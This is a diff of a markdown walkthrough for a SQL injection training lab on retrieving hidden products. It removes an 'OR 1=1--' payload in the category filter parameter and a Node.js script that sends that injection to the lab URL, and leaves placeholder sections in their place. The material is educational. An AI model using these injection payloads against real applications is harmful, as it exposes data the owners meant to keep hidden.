@@ -1,53 +1,33 @@
+---
+description: >-
+  In Lab One, we see a simple SQL injection vulnerability in a WHERE clause
+  allowing for the retrieval of hidden data.
+---
+
 # 1 - Retrieve Hidden Data
 
-### Notes
+### Hints
 
-The SQLi exists in the `category` query parameter used by the product category filter feature:
+<details>
 
-```http
-GET /filter?category=%27+OR+1=1-- HTTP/1.1
-```
+<summary>Hint One</summary>
 
-The underlying query therefor becomes something like:
+The SQL injection vulnerability exists in the...
 
-```sql
-GET * FROM products WHERE category='' OR 1=1--';
-```
+</details>
+
+### Full Walkthrough
+
+Coming soon...
 
 ### Scripted Solution
 
-```javascript
-const { JSDOM } = require('jsdom')
-require('dotenv').config({ path: './.env' })
+Coming soon...
 
-/**
- * Run exploit.
- */
-async function main() {
-  const levelUrl = process.env.LEVEL_URL
+### Security Issues & Mitigation
 
-  // Get number of products visible on lab home page
-  console.log('Getting home page product count...')
-  const homeDom = await JSDOM.fromURL(levelUrl)
-  const homeProductNodes = homeDom.window.document.querySelectorAll(
-    '.container-list-tiles div'
-  )
-  console.log(`Number of home page products: ${homeProductNodes.length}.`)
+Coming soon...
 
-  // Get number of products after SQL injection exploit
-  console.log('Performing SQLi and getting updated product count...')
-  const SQLi = "'+OR+1=1--"
-  const SQLiDom = await JSDOM.fromURL(`${levelUrl}/filter?category=${SQLi}`)
-  const SQLiProductNodes = SQLiDom.window.document.querySelectorAll(
-    '.container-list-tiles div'
-  )
-  console.log(`Number of home page products: ${SQLiProductNodes.length}.`)
-}
+### Key Takeaways
 
-main()
-  .then(() => process.exit(0))
-  .catch((error) => {
-    console.error(error)
-    process.exit(1)
-  })
-```
+Coming soon...
